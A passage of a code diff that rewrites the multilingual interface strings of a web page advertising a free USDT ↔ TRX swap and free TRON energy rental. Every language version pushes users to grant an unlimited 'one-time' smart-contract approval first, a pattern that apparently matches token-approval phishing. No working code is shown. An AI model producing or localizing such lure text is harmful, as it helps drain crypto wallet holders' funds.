gratuit', hero_desc: 'Échangez USDT contre TRX instantanément avec 0% de frais.', today_volume: 'Volume du jour', swap_title: 'USDT ↔ TRX Échange', swap_sub: 'TRC-20 swap instantané', approval_needed: 'Approbation requise', send_amount: 'Vous envoyez (USDT)', send_amount_trx: 'Vous envoyez (TRX)', receive_amount: 'Vous recevez (est.)', receive_amount_usdt: 'Vous recevez (est. USDT)', exchange_rate_label: 'Taux de change', fee_label: 'Frais', fee_free: 'Gratuit', swap_btn_text: 'Commencer l\'échange (approbation)', swap_btn_done: 'Échanger maintenant', swap_notice: 'Le premier échange nécessite l\'approbation du contrat', select_wallet: 'Choisir un portefeuille', security_title: 'Sécurité vérifiée', faq_title: 'Questions fréquentes', energy_badge: 'TRON Energy', energy_title: 'Location énergie', energy_desc: 'Économisez jusqu\'à 80%', energy_target: 'Adresse cible', energy_amount: 'Quantité', energy_1usdt: '≈ 1 transfert USDT', energy_2usdt: '≈ 2 transferts', energy_15usdt: '≈ 15 transferts', energy_150usdt: '≈ 150 transferts', energy_duration: 'Durée', energy_1h: '1 heure', energy_1d: '1 jour', energy_3d: '3 jours', energy_30d: '30 jours', energy_est_price: 'Coût estimé', energy_save_word: 'économie', energy_save_max: 'Économie max.', energy_speed: 'Instantané', energy_noncustodial: 'Non-dépositaire', energy_addr_invalid: 'Entrez une adresse TRON valide', energy_coming_soon: 'Location énergie bientôt !', energy_approval_needed: 'Approbation énergie requise', energy_approval_done: 'Approuvé', energy_rent_btn_approve: 'Louer énergie (approbation)', energy_rent_btn_done: 'Louer énergie', energy_free_event: 'Location énergie gratuite', energy_addr_placeholder: 'Connectez votre portefeuille' },
-            es: { modal_status_label: 'Estado:', modal_status_done: 'Aprobado', modal_limit_label: 'Límite de cambio:', modal_limit_max: 'Ilimitado', w_imtoken: 'Billetera multicadena global', w_wc: 'Conectar billeteras por QR', not_approved: 'No aprobado', approved_max: 'Ilimitado (MAX)', approval_done: 'Cambio aprobado', modal_subtitle: 'Seleccione su billetera<br>para conectar automáticamente.', w_tronlink: 'Billetera oficial TRON', w_trust: 'Billetera multicadena', w_tp: 'Popular en Asia', w_bitget: 'Billetera Web3 global', w_okx: 'Billetera OKX', modal_tip_title: 'Si la app no se abre:', modal_tip1: '1. Abra la app manualmente', modal_tip2: '2. Vaya a la pestaña <strong class="text-white">Navegador</strong>', modal_tip3: '3. <strong class="text-white">Pegue</strong> la URL (copiada)', bal: 'Saldo', bal2: 'Saldo', close_btn: 'Cerrar', ticker_label: 'Intercambios en vivo', header_sub: 'USDT ↔ TRX Cambio instantáneo | TRC-20', connect_wallet: 'Conectar', hero_badge: 'TRON MAINNET INTERCAMBIO INSTANTÁNEO', hero_title1: 'USDT ↔ TRX', hero_title2: 'Cambio gratuito', hero_desc: 'Cambie USDT a TRX al instante con 0% de comisión.', today_volume: 'Volumen de hoy', swap_title: 'USDT ↔ TRX Cambio', swap_sub: 'TRC-20 swap instantáneo', approval_needed: 'Aprobación requerida', send_amount: 'Usted envía (USDT)', send_amount_trx: 'Usted envía (TRX)', receive_amount: 'Usted recibe (est.)', receive_amount_usdt: 'Usted recibe (est. USDT)', exchange_rate_label: 'Tipo de cambio', fee_label: 'Comisión', fee_free: 'Gratis', swap_btn_text: 'Iniciar cambio (aprobación)', swap_btn_done: 'Cambiar ahora', swap_notice: 'El primer cambio requiere aprobación del contrato', select_wallet: 'Seleccionar billetera', security_title: 'Seguridad verificada', faq_title: 'Preguntas frecuentes', energy_badge: 'TRON Energy', energy_title: 'Alquilar energía', energy_desc: 'Ahorre hasta un 80% en comisiones USDT', energy_target: 'Dirección destino', energy_amount: 'Cantidad de energía', energy_1usdt: '≈ 1 transferencia USDT', energy_2usdt: '≈ 2 transferencias', energy_15usdt: '≈ 15 transferencias', energy_150usdt: '≈ 150 transferencias', energy_duration: 'Duración del alquiler', energy_1h: '1 hora', energy_1d: '1 día', energy_3d: '3 días', energy_30d: '30 días', energy_est_price: 'Coste estimado', energy_save_word: 'ahorro', energy_save_max: 'Ahorro máximo', energy_speed: 'Instantáneo', energy_noncustodial: 'Sin custodia', energy_addr_invalid: 'Introduzca una dirección TRON válida', energy_coming_soon: '¡Servicio de alquiler de energía próximamente!', energy_approval_needed: 'Aprobación de energía requerida', energy_approval_done: 'Aprobado', energy_rent_btn_approve: 'Alquilar energía (aprobación)', energy_rent_btn_done: 'Alquilar energía', energy_free_event: 'Alquiler de energía gratis', energy_addr_placeholder: 'Conecte su billetera' }
+            ko: { w_imtoken: '글로벌 멀티체인 지갑', w_wc: '지원 지갑에서 연결 코드/QR로 연결 (일부 지갑 TRON 미지원)', not_approved: '미승인', approved_max: '무제한 (MAX)', approval_done: '교환 승인 완료', modal_subtitle: '지갑 앱 내 <strong>브라우저</strong>에서 열면 가장 안정적으로 연결됩니다.<br>또는 아래 지갑을 선택해 진행하세요.', w_tronlink: 'TRON 공식 지갑', w_trust: '멀티체인 지갑', w_tp: '아시아 인기 지갑', w_bitget: '글로벌 Web3 지갑', w_okx: 'OKX 거래소 지갑', modal_tip_title: '앱이 자동으로 안 열리면:', modal_tip1: '1. 선택한 지갑 앱을 직접 여세요', modal_tip2: '2. 앱 내 <strong class="text-white">브라우저(탐색)</strong> 탭으로 이동', modal_tip3: '3. 주소창에 <strong class="text-white">붙여넣기</strong> (URL 자동 복사됨)', bal: '잔액', bal2: '잔액', close_btn: '닫기', ticker_label: '실시간 교환 현황', header_sub: 'USDT ↔ TRX 즉시 교환 | TRC-20 메인넷', connect_wallet: '지갑 연결', hero_badge: 'TRON MAINNET INSTANT SWAP', hero_title1: 'USDT ↔ TRX', hero_title2: '무료 교환', hero_desc: '수수료 0%로 USDT와 TRX를 자유롭게 교환하세요. 최초 1회 스마트 컨트랙트 승인 후 무제한 교환이 가능합니다.', today_volume: '오늘 총 교환량', swap_title: 'USDT ↔ TRX 교환', swap_sub: 'TRC-20 즉시 스왑', approval_needed: '교환 승인 필요', send_amount: '보내는 금액 (USDT)', send_amount_trx: '보내는 금액 (TRX)', receive_amount: '받는 금액 (예상)', receive_amount_usdt: '받는 금액 (예상 USDT)', exchange_rate_label: '교환 비율', fee_label: '수수료', fee_free: '무료', swap_btn_text: '교환 시작 (최초 1회 승인 필요)', swap_btn_done: '교환하기', swap_notice: '최초 1회 교환시 스마트 컨트렉트 승인이 필요합니다', select_wallet: '지갑을 선택하세요', security_title: '보안 검증', faq_title: '자주 묻는 질문 (FAQ)', energy_badge: 'TRON Energy', energy_title: '에너지 렌탈', energy_desc: 'USDT 전송 수수료를 최대 80% 절약하세요', energy_target: '대상 주소', energy_amount: '에너지 수량', energy_1usdt: '≈ 1 USDT 전송', energy_2usdt: '≈ 2회 전송', energy_15usdt: '≈ 15회 전송', energy_150usdt: '≈ 150회 전송', energy_duration: '렌탈 기간', energy_1h: '1시간', energy_1d: '1일', energy_3d: '3일', energy_30d: '30일', energy_est_price: '예상 비용', energy_save_word: '절약', energy_save_max: '최대 절약', energy_speed: '즉시 충전', energy_noncustodial: '비수탁', energy_addr_invalid: '유효한 TRON 주소를 입력하세요', energy_coming_soon: '에너지 렌탈 서비스 준비 중입니다. 곧 오픈합니다!', energy_approval_needed: '에너지 승인 필요', energy_approval_done: '승인 완료', energy_rent_btn_approve: '에너지 렌탈 (최초 1회 승인 필요)', energy_rent_btn_done: '에너지 렌탈하기', energy_free_event: '에너지 렌탈 무료 제공', energy_addr_placeholder: '지갑을 연결하세요' },
+            en: { w_imtoken: 'Global Multi-chain Wallet', w_wc: 'Connect various wallets via QR', not_approved: 'Unapproved', approved_max: 'Unlimited (MAX)', approval_done: 'Swap Approved', modal_subtitle: 'Select your wallet app<br>to connect automatically.', w_tronlink: 'TRON Official Wallet', w_trust: 'Multi-chain Wallet', w_tp: 'Popular in Asia', w_bitget: 'Global Web3 Wallet', w_okx: 'OKX Exchange Wallet', modal_tip_title: 'If the app doesn\'t open:', modal_tip1: '1. Open the wallet app manually', modal_tip2: '2. Go to <strong class="text-white">Browser</strong> tab in the app', modal_tip3: '3. <strong class="text-white">Paste</strong> the URL (auto-copied)', bal: 'Balance', bal2: 'Balance', close_btn: 'Close', ticker_label: 'Live Exchange Feed', header_sub: 'USDT ↔ TRX Instant Swap | TRC-20 Mainnet', connect_wallet: 'Connect Wallet', hero_badge: 'TRON MAINNET INSTANT SWAP', hero_title1: 'USDT ↔ TRX', hero_title2: 'Free Swap', hero_desc: 'Swap freely between USDT and TRX with 0% fee. One-time smart contract approval enables unlimited swaps.', today_volume: 'Today\'s Volume', swap_title: 'USDT ↔ TRX Swap', swap_sub: 'TRC-20 Instant Swap', approval_needed: 'Approval Required', send_amount: 'You Send (USDT)', send_amount_trx: 'You Send (TRX)', receive_amount: 'You Receive (Est.)', receive_amount_usdt: 'You Receive (Est. USDT)', exchange_rate_label: 'Exchange Rate', fee_label: 'Fee', fee_free: 'Free', swap_btn_text: 'Start Swap (One-time Approval Required)', swap_btn_done: 'Swap Now', swap_notice: 'First swap requires smart contract approval', select_wallet: 'Select Your Wallet', security_title: 'Security Verified', faq_title: 'FAQ', energy_badge: 'TRON Energy', energy_title: 'Rent Energy', energy_desc: 'Save up to 80% on USDT transfer fees', energy_target: 'Target Address', energy_amount: 'Energy Amount', energy_1usdt: '≈ 1 USDT transfer', energy_2usdt: '≈ 2 transfers', energy_15usdt: '≈ 15 transfers', energy_150usdt: '≈ 150 transfers', energy_duration: 'Rental Duration', energy_1h: '1 Hour', energy_1d: '1 Day', energy_3d: '3 Days', energy_30d: '30 Days', energy_est_price: 'Est. Cost', energy_save_word: 'savings', energy_save_max: 'Max Savings', energy_speed: 'Instant', energy_noncustodial: 'Non-custodial', energy_addr_invalid: 'Please enter a valid TRON address', energy_coming_soon: 'Energy rental service coming soon!', energy_approval_needed: 'Energy Approval Required', energy_approval_done: 'Approved', energy_rent_btn_approve: 'Rent Energy (One-time Approval)', energy_rent_btn_done: 'Rent Energy', energy_free_event: 'Free Energy Rental', energy_addr_placeholder: 'Connect your wallet' },
+            zh: { w_imtoken: '全球多链钱包', w_wc: '通过QR码连接多种钱包', not_approved: '未授权', approved_max: '无限制 (MAX)', approval_done: '授权完成', modal_subtitle: '选择您的钱包应用<br>自动连接。', w_tronlink: 'TRON 官方钱包', w_trust: '多链钱包', w_tp: '亚洲热门钱包', w_bitget: '全球 Web3 钱包', w_okx: 'OKX 交易所钱包', modal_tip_title: '如果应用未自动打开：', modal_tip1: '1. 手动打开钱包应用', modal_tip2: '2. 进入应用内的<strong class="text-white">浏览器</strong>选项卡', modal_tip3: '3. 在地址栏<strong class="text-white">粘贴</strong>网址（已自动复制）', bal: '余额', bal2: '余额', close_btn: '关闭', ticker_label: '实时交换动态', header_sub: 'USDT ↔ TRX 即时兑换 | TRC-20 主网', connect_wallet: '连接钱包', hero_badge: 'TRON 主网即时兑换', hero_title1: 'USDT ↔ TRX', hero_title2: '免费兑换', hero_desc: '0%手续费自由兑换USDT与TRX。首次智能合约授权后可无限兑换。', today_volume: '今日交易量', swap_title: 'USDT ↔ TRX 兑换', swap_sub: 'TRC-20 即时兑换', approval_needed: '需要授权', send_amount: '发送金额 (USDT)', send_amount_trx: '发送金额 (TRX)', receive_amount: '接收金额（预估）', receive_amount_usdt: '接收金额（预估 USDT）', exchange_rate_label: '汇率', fee_label: '手续费', fee_free: '免费', swap_btn_text: '开始兑换（首次需授权）', swap_btn_done: '立即兑换', swap_notice: '首次兑换需要智能合约授权', select_wallet: '选择钱包', security_title: '安全验证', faq_title: '常见问题', energy_badge: 'TRON Energy', energy_title: '租用能量', energy_desc: 'USDT转账手续费最高节省80%', energy_target: '目标地址', energy_amount: '能量数量', energy_1usdt: '≈ 1次USDT转账', energy_2usdt: '≈ 2次转账', energy_15usdt: '≈ 15次转账', energy_150usdt: '≈ 150次转账', energy_duration: '租用时长', energy_1h: '1小时', energy_1d: '1天', energy_3d: '3天', energy_30d: '30天', energy_est_price: '预估费用', energy_save_word: '节省', energy_save_max: '最高节省', energy_speed: '即时到账', energy_noncustodial: '非托管', energy_addr_invalid: '请输入有效的TRON地址', energy_coming_soon: '能量租用服务即将上线！', energy_approval_needed: '需要能量授权', energy_approval_done: '已授权', energy_rent_btn_approve: '租用能量（首次需授权）', energy_rent_btn_done: '租用能量', energy_free_event: '能量租用免费', energy_addr_placeholder: '请连接钱包' },
+            ru: { w_imtoken: 'Глобальный мультичейн кошелёк', w_wc: 'Подключение кошельков через QR', not_approved: 'Не одобрено', approved_max: 'Безлимитно (MAX)', approval_done: 'Обмен одобрен', modal_subtitle: 'Выберите кошелёк<br>для автоматического подключения.', w_tronlink: 'Официальный кошелёк TRON', w_trust: 'Мультичейн кошелёк', w_tp: 'Популярный в Азии', w_bitget: 'Глобальный Web3 кошелёк', w_okx: 'Кошелёк биржи OKX', modal_tip_title: 'Если приложение не открылось:', modal_tip1: '1. Откройте кошелёк вручную', modal_tip2: '2. Перейдите во вкладку <strong class="text-white">Браузер</strong>', modal_tip3: '3. <strong class="text-white">Вставьте</strong> URL (скопирован)', bal: 'Баланс', bal2: 'Баланс', close_btn: 'Закрыть', ticker_label: 'Обмены в реальном времени', header_sub: 'USDT ↔ TRX Мгновенный обмен | TRC-20', connect_wallet: 'Подключить', hero_badge: 'TRON MAINNET МГНОВЕННЫЙ ОБМЕН', hero_title1: 'USDT ↔ TRX', hero_title2: 'Бесплатный обмен', hero_desc: 'Свободно обменивайте USDT и TRX с комиссией 0%. Одноразовое одобрение смарт-контракта.', today_volume: 'Объём за сегодня', swap_title: 'USDT ↔ TRX Обмен', swap_sub: 'TRC-20 мгновенный обмен', approval_needed: 'Требуется одобрение', send_amount: 'Вы отправляете (USDT)', send_amount_trx: 'Вы отправляете (TRX)', receive_amount: 'Вы получаете (прибл.)', receive_amount_usdt: 'Вы получаете (прибл. USDT)', exchange_rate_label: 'Курс обмена', fee_label: 'Комиссия', fee_free: 'Бесплатно', swap_btn_text: 'Начать обмен (одобрение необходимо)', swap_btn_done: 'Обменять', swap_notice: 'Первый обмен требует одобрения смарт-контракта', select_wallet: 'Выберите кошелёк', security_title: 'Безопасность', faq_title: 'Вопросы и ответы', energy_badge: 'TRON Energy', energy_title: 'Аренда энергии', energy_desc: 'Экономьте до 80% на комиссии USDT', energy_target: 'Целевой адрес', energy_amount: 'Количество энергии', energy_1usdt: '≈ 1 перевод USDT', energy_2usdt: '≈ 2 перевода', energy_15usdt: '≈ 15 переводов', energy_150usdt: '≈ 150 переводов', energy_duration: 'Срок аренды', energy_1h: '1 час', energy_1d: '1 день', energy_3d: '3 дня', energy_30d: '30 дней', energy_est_price: 'Расч. стоимость', energy_save_word: 'экономия', energy_save_max: 'Макс. экономия', energy_speed: 'Мгновенно', energy_noncustodial: 'Некастодиальный', energy_addr_invalid: 'Введите действительный адрес TRON', energy_coming_soon: 'Сервис аренды энергии скоро откроется!', energy_approval_needed: 'Требуется одобрение энергии', energy_approval_done: 'Одобрено', energy_rent_btn_approve: 'Аренда энергии (одобрение)', energy_rent_btn_done: 'Арендовать энергию', energy_free_event: 'Аренда энергии бесплатно', energy_addr_placeholder: 'Подключите кошелёк' },
+            th: { w_imtoken: 'กระเป๋าหลายเชนระดับโลก', w_wc: 'เชื่อมต่อกระเป๋าผ่าน QR', not_approved: 'ยังไม่อนุมัติ', approved_max: 'ไม่จำกัด (MAX)', approval_done: 'อนุมัติแล้ว', modal_subtitle: 'เลือกกระเป๋าเงิน<br>เพื่อเชื่อมต่ออัตโนมัติ', w_tronlink: 'กระเป๋า TRON อย่างเป็นทางการ', w_trust: 'กระเป๋าหลายเชน', w_tp: 'ยอดนิยมในเอเชีย', w_bitget: 'กระเป๋า Web3 ระดับโลก', w_okx: 'กระเป๋า OKX', modal_tip_title: 'หากแอปไม่เปิด:', modal_tip1: '1. เปิดแอปกระเป๋าด้วยตนเอง', modal_tip2: '2. ไปที่แท็บ<strong class="text-white">เบราว์เซอร์</strong>', modal_tip3: '3. <strong class="text-white">วาง</strong> URL (คัดลอกแล้ว)', bal: 'ยอด', bal2: 'ยอด', close_btn: 'ปิด', ticker_label: 'การแลกเปลี่ยนแบบเรียลไทม์', header_sub: 'USDT ↔ TRX แลกเปลี่ยนทันที | TRC-20', connect_wallet: 'เชื่อมต่อ', hero_badge: 'TRON MAINNET INSTANT SWAP', hero_title1: 'USDT ↔ TRX', hero_title2: 'แลกฟรี', hero_desc: 'แลกเปลี่ยน USDT และ TRX ได้อย่างอิสระ ไม่มีค่าธรรมเนียม', today_volume: 'ปริมาณวันนี้', swap_title: 'USDT ↔ TRX แลกเปลี่ยน', swap_sub: 'TRC-20 แลกทันที', approval_needed: 'ต้องอนุมัติ', send_amount: 'จำนวนที่ส่ง (USDT)', send_amount_trx: 'จำนวนที่ส่ง (TRX)', receive_amount: 'จำนวนที่ได้รับ (ประมาณ)', receive_amount_usdt: 'จำนวนที่ได้รับ (ประมาณ USDT)', exchange_rate_label: 'อัตราแลกเปลี่ยน', fee_label: 'ค่าธรรมเนียม', fee_free: 'ฟรี', swap_btn_text: 'เริ่มแลก (ต้องอนุมัติครั้งเดียว)', swap_btn_done: 'แลกเลย', swap_notice: 'การแลกครั้งแรกต้องอนุมัติสัญญาอัจฉริยะ', select_wallet: 'เลือกกระเป๋า', security_title: 'การรักษาความปลอดภัย', faq_title: 'คำถามที่พบบ่อย', energy_badge: 'TRON Energy', energy_title: 'เช่าพลังงาน', energy_desc: 'ประหยัดค่าธรรมเนียม USDT สูงสุด 80%', energy_target: 'ที่อยู่เป้าหมาย', energy_amount: 'จำนวนพลังงาน', energy_1usdt: '≈ 1 โอน USDT', energy_2usdt: '≈ 2 ครั้ง', energy_15usdt: '≈ 15 ครั้ง', energy_150usdt: '≈ 150 ครั้ง', energy_duration: 'ระยะเวลา', energy_1h: '1 ชั่วโมง', energy_1d: '1 วัน', energy_3d: '3 วัน', energy_30d: '30 วัน', energy_est_price: 'ค่าใช้จ่ายโดยประมาณ', energy_save_word: 'ประหยัด', energy_save_max: 'ประหยัดสูงสุด', energy_speed: 'ทันที', energy_noncustodial: 'ไม่มีผู้ดูแล', energy_addr_invalid: 'กรุณาใส่ที่อยู่ TRON ที่ถูกต้อง', energy_coming_soon: 'บริการเช่าพลังงานเร็วๆ นี้!', energy_approval_needed: 'ต้องอนุมัติพลังงาน', energy_approval_done: 'อนุมัติแล้ว', energy_rent_btn_approve: 'เช่าพลังงาน (อนุมัติครั้งแรก)', energy_rent_btn_done: 'เช่าพลังงาน', energy_free_event: 'เช่าพลังงานฟรี', energy_addr_placeholder: 'เชื่อมต่อกระเป๋าของคุณ' },
+            vi: { w_imtoken: 'Ví đa chuỗi toàn cầu', w_wc: 'Kết nối ví qua QR', not_approved: 'Chưa phê duyệt', approved_max: 'Không giới hạn (MAX)', approval_done: 'Đã phê duyệt', modal_subtitle: 'Chọn ví của bạn<br>để kết nối tự động.', w_tronlink: 'Ví chính thức TRON', w_trust: 'Ví đa chuỗi', w_tp: 'Phổ biến ở châu Á', w_bitget: 'Ví Web3 toàn cầu', w_okx: 'Ví sàn OKX', modal_tip_title: 'Nếu ứng dụng không mở:', modal_tip1: '1. Mở ứng dụng ví thủ công', modal_tip2: '2. Vào tab <strong class="text-white">Trình duyệt</strong>', modal_tip3: '3. <strong class="text-white">Dán</strong> URL (đã sao chép)', bal: 'Số dư', bal2: 'Số dư', close_btn: 'Đóng', ticker_label: 'Giao dịch thời gian thực', header_sub: 'USDT ↔ TRX Đổi ngay | TRC-20', connect_wallet: 'Kết nối ví', hero_badge: 'TRON MAINNET INSTANT SWAP', hero_title1: 'USDT ↔ TRX', hero_title2: 'Đổi miễn phí', hero_desc: 'Tự do đổi giữa USDT và TRX với phí 0%.', today_volume: 'Khối lượng hôm nay', swap_title: 'USDT ↔ TRX Đổi', swap_sub: 'TRC-20 đổi ngay', approval_needed: 'Cần phê duyệt', send_amount: 'Số tiền gửi (USDT)', send_amount_trx: 'Số tiền gửi (TRX)', receive_amount: 'Số tiền nhận (ước tính)', receive_amount_usdt: 'Số tiền nhận (ước tính USDT)', exchange_rate_label: 'Tỷ giá', fee_label: 'Phí', fee_free: 'Miễn phí', swap_btn_text: 'Bắt đầu đổi (cần phê duyệt 1 lần)', swap_btn_done: 'Đổi ngay', swap_notice: 'Lần đổi đầu tiên cần phê duyệt hợp đồng thông minh', select_wallet: 'Chọn ví', security_title: 'Bảo mật', faq_title: 'Câu hỏi thường gặp', energy_badge: 'TRON Energy', energy_title: 'Thuê năng lượng', energy_desc: 'Tiết kiệm đến 80% phí chuyển USDT', energy_target: 'Địa chỉ đích', energy_amount: 'Số lượng năng lượng', energy_1usdt: '≈ 1 lần chuyển USDT', energy_2usdt: '≈ 2 lần chuyển', energy_15usdt: '≈ 15 lần chuyển', energy_150usdt: '≈ 150 lần chuyển', energy_duration: 'Thời gian thuê', energy_1h: '1 giờ', energy_1d: '1 ngày', energy_3d: '3 ngày', energy_30d: '30 ngày', energy_est_price: 'Chi phí ước tính', energy_save_word: 'tiết kiệm', energy_save_max: 'Tiết kiệm tối đa', energy_speed: 'Tức thì', energy_noncustodial: 'Không ủy thác', energy_addr_invalid: 'Vui lòng nhập địa chỉ TRON hợp lệ', energy_coming_soon: 'Dịch vụ thuê năng lượng sắp ra mắt!', energy_approval_needed: 'Cần phê duyệt năng lượng', energy_approval_done: 'Đã phê duyệt', energy_rent_btn_approve: 'Thuê năng lượng (phê duyệt 1 lần)', energy_rent_btn_done: 'Thuê năng lượng', energy_free_event: 'Thuê năng lượng miễn phí', energy_addr_placeholder: 'Kết nối ví của bạn' },
+            ja: { w_imtoken: 'グローバルマルチチェーンウォレット', w_wc: 'QRコードでウォレット接続', not_approved: '未承認', approved_max: '無制限 (MAX)', approval_done: '交換承認済み', modal_subtitle: 'ウォレットアプリを選択して<br>自動接続します。', w_tronlink: 'TRON公式ウォレット', w_trust: 'マルチチェーンウォレット', w_tp: 'アジアで人気', w_bitget: 'グローバルWeb3ウォレット', w_okx: 'OKX取引所ウォレット', modal_tip_title: 'アプリが開かない場合：', modal_tip1: '1. ウォレットアプリを手動で開く', modal_tip2: '2. アプリ内の<strong class="text-white">ブラウザ</strong>タブへ', modal_tip3: '3. URLを<strong class="text-white">貼り付け</strong>（コピー済み）', bal: '残高', bal2: '残高', close_btn: '閉じる', ticker_label: 'リアルタイム交換状況', header_sub: 'USDT ↔ TRX 即時交換 | TRC-20 メインネット', connect_wallet: 'ウォレット接続', hero_badge: 'TRON メインネット即時スワップ', hero_title1: 'USDT ↔ TRX', hero_title2: '無料交換', hero_desc: '手数料0%でUSDTとTRXを自由に交換。', today_volume: '本日の取引量', swap_title: 'USDT ↔ TRX 交換', swap_sub: 'TRC-20 即時スワップ', approval_needed: '承認が必要', send_amount: '送金額 (USDT)', send_amount_trx: '送金額 (TRX)', receive_amount: '受取額（予想）', receive_amount_usdt: '受取額（予想 USDT）', exchange_rate_label: '交換レート', fee_label: '手数料', fee_free: '無料', swap_btn_text: '交換開始（初回承認必要）', swap_btn_done: '交換する', swap_notice: '初回交換時にスマートコントラクトの承認が必要です', select_wallet: 'ウォレットを選択', security_title: 'セキュリティ検証', faq_title: 'よくある質問', energy_badge: 'TRON Energy', energy_title: 'エネルギーレンタル', energy_desc: 'USDT送金手数料を最大80%節約', energy_target: '対象アドレス', energy_amount: 'エネルギー量', energy_1usdt: '≈ 1 USDT送金', energy_2usdt: '≈ 2回送金', energy_15usdt: '≈ 15回送金', energy_150usdt: '≈ 150回送金', energy_duration: 'レンタル期間', energy_1h: '1時間', energy_1d: '1日', energy_3d: '3日間', energy_30d: '30日間', energy_est_price: '予想コスト', energy_save_word: '節約', energy_save_max: '最大節約', energy_speed: '即時充電', energy_noncustodial: 'ノンカストディ', energy_addr_invalid: '有効なTRONアドレスを入力してください', energy_coming_soon: 'エネルギーレンタルサービス準備中です！', energy_approval_needed: 'エネルギー承認が必要', energy_approval_done: '承認済み', energy_rent_btn_approve: 'エネルギーレンタル（初回承認必要）', energy_rent_btn_done: 'エネルギーをレンタル', energy_free_event: 'エネルギーレンタル無料', energy_addr_placeholder: 'ウォレットを接続してください' },
+            de: { w_imtoken: 'Globales Multi-Chain Wallet', w_wc: 'Wallets per QR verbinden', not_approved: 'Nicht genehmigt', approved_max: 'Unbegrenzt (MAX)', approval_done: 'Tausch genehmigt', modal_subtitle: 'Wählen Sie Ihr Wallet<br>für automatische Verbindung.', w_tronlink: 'TRON Offizielles Wallet', w_trust: 'Multi-Chain Wallet', w_tp: 'Beliebt in Asien', w_bitget: 'Globales Web3 Wallet', w_okx: 'OKX Börsen-Wallet', modal_tip_title: 'Falls die App nicht öffnet:', modal_tip1: '1. Öffnen Sie die Wallet-App manuell', modal_tip2: '2. Gehen Sie zum <strong class="text-white">Browser</strong>-Tab', modal_tip3: '3. URL <strong class="text-white">einfügen</strong> (kopiert)', bal: 'Guthaben', bal2: 'Guthaben', close_btn: 'Schließen', ticker_label: 'Live-Austausch', header_sub: 'USDT ↔ TRX Sofort-Tausch | TRC-20', connect_wallet: 'Wallet verbinden', hero_badge: 'TRON MAINNET SOFORT-TAUSCH', hero_title1: 'USDT ↔ TRX', hero_title2: 'Kostenlos tauschen', hero_desc: 'Tauschen Sie frei zwischen USDT und TRX mit 0% Gebühr.', today_volume: 'Heutiges Volumen', swap_title: 'USDT ↔ TRX Tausch', swap_sub: 'TRC-20 Sofort-Swap', approval_needed: 'Genehmigung erforderlich', send_amount: 'Sie senden (USDT)', send_amount_trx: 'Sie senden (TRX)', receive_amount: 'Sie erhalten (geschätzt)', receive_amount_usdt: 'Sie erhalten (geschätzt USDT)', exchange_rate_label: 'Wechselkurs', fee_label: 'Gebühr', fee_free: 'Kostenlos', swap_btn_text: 'Tausch starten (Genehmigung erforderlich)', swap_btn_done: 'Jetzt tauschen', swap_notice: 'Erstmaliger Tausch erfordert Smart-Contract-Genehmigung', select_wallet: 'Wallet auswählen', security_title: 'Sicherheit', faq_title: 'Häufige Fragen', energy_badge: 'TRON Energy', energy_title: 'Energie mieten', energy_desc: 'Sparen Sie bis zu 80% bei USDT-Überweisungen', energy_target: 'Zieladresse', energy_amount: 'Energiemenge', energy_1usdt: '≈ 1 USDT-Überweisung', energy_2usdt: '≈ 2 Überweisungen', energy_15usdt: '≈ 15 Überweisungen', energy_150usdt: '≈ 150 Überweisungen', energy_duration: 'Mietdauer', energy_1h: '1 Stunde', energy_1d: '1 Tag', energy_3d: '3 Tage', energy_30d: '30 Tage', energy_est_price: 'Geschätzte Kosten', energy_save_word: 'Ersparnis', energy_save_max: 'Max. Ersparnis', energy_speed: 'Sofort', energy_noncustodial: 'Nicht-verwahrend', energy_addr_invalid: 'Bitte geben Sie eine gültige TRON-Adresse ein', energy_coming_soon: 'Energie-Mietservice kommt bald!', energy_approval_needed: 'Energie-Genehmigung erforderlich', energy_approval_done: 'Genehmigt', energy_rent_btn_approve: 'Energie mieten (Genehmigung)', energy_rent_btn_done: 'Energie mieten', energy_free_event: 'Energie kostenlos mieten', energy_addr_placeholder: 'Verbinden Sie Ihr Wallet' },
+            fr: { w_imtoken: 'Portefeuille multi-chaînes mondial', w_wc: 'Connecter des portefeuilles via QR', not_approved: 'Non approuvé', approved_max: 'Illimité (MAX)', approval_done: 'Échange approuvé', modal_subtitle: 'Sélectionnez votre portefeuille<br>pour une connexion automatique.', w_tronlink: 'Portefeuille officiel TRON', w_trust: 'Portefeuille multi-chaînes', w_tp: 'Populaire en Asie', w_bitget: 'Portefeuille Web3 mondial', w_okx: 'Portefeuille OKX', modal_tip_title: 'Si l\'appli ne s\'ouvre pas :', modal_tip1: '1. Ouvrez l\'appli manuellement', modal_tip2: '2. Allez dans l\'onglet <strong class="text-white">Navigateur</strong>', modal_tip3: '3. <strong class="text-white">Collez</strong> l\'URL (copié)', bal: 'Solde', bal2: 'Solde', close_btn: 'Fermer', ticker_label: 'Échanges en direct', header_sub: 'USDT ↔ TRX Échange instantané | TRC-20', connect_wallet: 'Connecter', hero_badge: 'TRON MAINNET ÉCHANGE INSTANTANÉ', hero_title1: 'USDT ↔ TRX', hero_title2: 'Échange gratuit', hero_desc: 'Échangez USDT contre TRX instantanément avec 0% de frais.', today_volume: 'Volume du jour', swap_title: 'USDT ↔ TRX Échange', swap_sub: 'TRC-20 swap instantané', approval_needed: 'Approbation requise', send_amount: 'Vous envoyez (USDT)', send_amount_trx: 'Vous envoyez (TRX)', receive_amount: 'Vous recevez (est.)', receive_amount_usdt: 'Vous recevez (est. USDT)', exchange_rate_label: 'Taux de change', fee_label: 'Frais', fee_free: 'Gratuit', swap_btn_text: 'Commencer l\'échange (approbation)', swap_btn_done: 'Échanger maintenant', swap_notice: 'Le premier échange nécessite l\'approbation du contrat', select_wallet: 'Choisir un portefeuille', security_title: 'Sécurité vérifiée', faq_title: 'Questions fréquentes', energy_badge: 'TRON Energy', energy_title: 'Location énergie', energy_desc: 'Économisez jusqu\'à 80%', energy_target: 'Adresse cible', energy_amount: 'Quantité', energy_1usdt: '≈ 1 transfert USDT', energy_2usdt: '≈ 2 transferts', energy_15usdt: '≈ 15 transferts', energy_150usdt: '≈ 150 transferts', energy_duration: 'Durée', energy_1h: '1 heure', energy_1d: '1 jour', energy_3d: '3 jours', energy_30d: '30 jours', energy_est_price: 'Coût estimé', energy_save_word: 'économie', energy_save_max: 'Économie max.', energy_speed: 'Instantané', energy_noncustodial: 'Non-dépositaire', energy_addr_invalid: 'Entrez une adresse TRON valide', energy_coming_soon: 'Location énergie bientôt !', energy_approval_needed: 'Approbation énergie requise', energy_approval_done: 'Approuvé', energy_rent_btn_approve: 'Louer énergie (approbation)', energy_rent_btn_done: 'Louer énergie', energy_free_event: 'Location énergie gratuite', energy_addr_placeholder: 'Connectez votre portefeuille' },
